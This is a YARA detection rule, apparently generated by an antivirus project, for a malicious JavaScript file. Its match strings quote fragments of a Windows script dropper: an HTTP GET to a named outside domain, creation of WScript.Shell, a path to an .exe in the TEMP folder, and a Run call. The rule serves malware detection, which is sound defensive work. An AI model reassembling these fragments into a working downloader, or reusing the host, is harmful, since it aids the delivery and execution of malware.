rule sig_20160330_5ad8a48d40fe04a26d4637aa3967654f {
  meta:
    description = "datamaliciousorder - file 20160330_5ad8a48d40fe04a26d4637aa3967654f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4ab774a2ba935a299da734b0605ac4648e9917230318e19bcc8babed4470e61e"

  strings:
    $s1  = "_V1[_Z](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "function _PI(_I, _W){_ZG = _ZG * 1; return _I - _W;};" fullword ascii
    $s3  = "var _Z0 = function _T() {return WScript[_VI](\"WScript\"+\".Shell\");}(), _OY = 11;" fullword ascii
    $s4  = "if (_V1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _HL() {return _Z0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LP8Sb5Zrl3npvap.ex\" + \"e\";};" fullword ascii
    $s6  = "function _LZ(){return _D + \"\";};" fullword ascii
    $s7  = "function _NS(_D0){_Z0[\"Run\"](_D0, _ZG, _ZG);};" fullword ascii
    $s8  = "function _UI() {return ((_M == true) && (_M == _C0)) ? 1 : _ZG;};" fullword ascii
    $s9  = "var _U0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _V()" fullword ascii
    $s11 = "function _VE(){return _VI;};" fullword ascii
    $s12 = " while (_R){" fullword ascii
    $s13 = "function _T0(){return 22;};" fullword ascii
    $s14 = "return _PI(_U1, _CG);" fullword ascii
    $s15 = "function _FI(_SM) {var _C = (1, 2, 3, 4, 5, _SM); return _C;};" fullword ascii
    $s16 = "var _C0 = false;" fullword ascii
    $s17 = "var _LY = false;" fullword ascii
    $s18 = "_M = true; " fullword ascii
    $s19 = "_C0 = true; " fullword ascii
    $s20 = "var _M = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}